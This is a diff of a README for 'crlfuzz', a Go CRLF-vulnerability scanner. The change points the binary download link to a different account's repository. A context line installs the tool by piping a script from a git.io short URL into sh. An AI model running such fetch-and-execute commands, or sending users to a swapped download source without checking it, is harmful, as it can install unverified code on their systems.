@@ -33,7 +33,7 @@ A fast tool to scan CRLF vulnerability written in Go
 
 ### from Binary
 
-The installation is easy. You can download a prebuilt binary from [releases page](https://github.com/dwisiswant0/crlfuzz/releases), unpack and run! or with
+The installation is easy. You can download a prebuilt binary from [releases page](https://github.com/hackz-01/crlfi/releases), unpack and run! or with
 
 ```bash
 ▶ curl -sSfL https://git.io/crlfuzz | sh -s -- -b /usr/local/bin
